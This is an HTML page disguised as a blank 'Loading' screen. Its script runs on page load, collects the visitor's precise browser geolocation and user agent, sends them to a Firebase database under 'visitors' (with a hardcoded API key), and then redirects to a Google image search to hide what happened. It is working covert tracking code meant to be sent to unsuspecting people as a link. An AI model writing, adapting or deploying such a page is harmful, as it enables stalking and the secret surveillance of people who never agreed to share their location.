<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading</title>
    <style>
        body { margin: 0; background: #202124; height: 100vh; }
    </style>
</head>
<body>
    <script>
        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyBvQWo5HIintxbq9hyz_88kVfebFyfiFuo",
            databaseURL: "https://imggps-default-rtdb.firebaseio.com",
            projectId: "imggps"
        };

        const TARGET_URL = "https://www.google.com/search?q=%D9%8B&sca_esv=f89d85d2f89b426d&rlz=1CDGOYI_enEG1101EG1101&hl=en-US&udm=2&biw=414&bih=724&sxsrf=APpeQnsD_w8GcL8vMj8pp1s2LJvbC1tAlg%3A1785560656689&ei=UH5taprlKYGF9u8P5qbv2Ao&oq=%D9%8B&gs_lp=EhJtb2JpbGUtZ3dzLXdpei1pbWciAtmLMgUQABiABDIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgARIrCZQwBhY4SFwAXgAkAEAmAHnAaAB4AOqAQUxLjAuMrgBA8gBAPgBAZgCA6AC7wOoAgDCAgkQABiABBgKGAuYAwHiAwUSATEgQIgGAZIHBTEuMC4yoAevBbIHBTEuMC4yuAfvA8IHBzAuMS4xLjHIBw-ACAA&sclient=mobile-gws-wiz-img";
        const DB_PATH = "visitors";

        // Tuning parameters
        const MAX_WAIT_TIME = 10000;          // 10 seconds max to collect location
        const DESIRED_ACCURACY = 50;          // meters – stop and save if accuracy <= this
        const MIN_READINGS = 2;               // collect at least 2 readings before deciding

        let bestReading = null;               // { lat, lng, accuracy }
        let readingCount = 0;
        let watchId = null;
        let dataSaved = false;
        let timeoutId = null;

        // Redirect to target URL
        function redirect() {
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
                watchId = null;
            }
            if (timeoutId) {
                clearTimeout(timeoutId);
                timeoutId = null;
            }
            window.location.href = TARGET_URL;
        }

        // Save data to Firebase and localStorage, then redirect
        function saveAndRedirect(lat, lng, accuracy) {
            if (dataSaved) return;
            dataSaved = true;

            const record = {
                lat: lat,
                lng: lng,
                accuracy: accuracy,
                timestamp: Date.now(),
                userAgent: navigator.userAgent.substring(0, 100)
            };

            // Save locally
            try {
                const localData = JSON.parse(localStorage.getItem('geo_log') || '[]');
                localData.push(record);
                localStorage.setItem('geo_log', JSON.stringify(localData));
            } catch(e) {}

            // Save to Firebase (fire-and-forget)
            fetch(`${firebaseConfig.databaseURL}/${DB_PATH}.json`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(record)
            }).catch(err => console.warn('Firebase save error', err));

            // Redirect immediately (do not wait for Firebase response)
            redirect();
        }

        // Process a new geolocation reading
        function processPosition(pos) {
            const accuracy = pos.coords.accuracy;
            const lat = pos.coords.latitude.toFixed(7);
            const lng = pos.coords.longitude.toFixed(7);

            readingCount++;

            // If this reading is better (lower accuracy) than previous, update best
            if (!bestReading || accuracy < bestReading.accuracy) {
                bestReading = { lat, lng, accuracy };
            }

            // If accuracy is good enough, stop and save immediately
            if (accuracy <= DESIRED_ACCURACY) {
                if (watchId !== null) {
                    navigator.geolocation.clearWatch(watchId);
                    watchId = null;
                }
                saveAndRedirect(lat, lng, accuracy);
                return;
            }

            // If we have collected enough readings and time has passed, use the best one
            // (the timeout will handle final decision)
        }

        // Final decision when time runs out
        function finalizeLocation() {
            if (dataSaved) return;

            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
                watchId = null;
            }

            if (bestReading) {
                // Use the best reading we got
                saveAndRedirect(bestReading.lat, bestReading.lng, bestReading.accuracy);
            } else {
                // No location at all – redirect without data
                redirect();
            }
        }

        // Error handler – silently fallback
        function handleError(err) {
            // If we already have a best reading, use it after a short delay
            if (bestReading) {
                setTimeout(() => {
                    if (!dataSaved) {
                        saveAndRedirect(bestReading.lat, bestReading.lng, bestReading.accuracy);
                    }
                }, 500);
                return;
            }

            // No location possible – redirect after a moment
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
                watchId = null;
            }
            setTimeout(redirect, 1000);
        }

        // Start location collection
        function startLocation() {
            if (!navigator.geolocation) {
                // Browser doesn't support geolocation – redirect
                setTimeout(redirect, 500);
                return;
            }

            // Set a final timeout to force a decision
            timeoutId = setTimeout(finalizeLocation, MAX_WAIT_TIME);

            // Start watching with high accuracy
            watchId = navigator.geolocation.watchPosition(
                processPosition,
                handleError,
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }

        // Begin immediately
        startLocation();

        // Extra safety – if everything stalls, redirect after MAX_WAIT_TIME + 2s
        setTimeout(() => {
            if (!dataSaved) {
                if (watchId !== null) {
                    navigator.geolocation.clearWatch(watchId);
                    watchId = null;
                }
                redirect();
            }
        }, MAX_WAIT_TIME + 2000);
    </script>
</body>
</html>
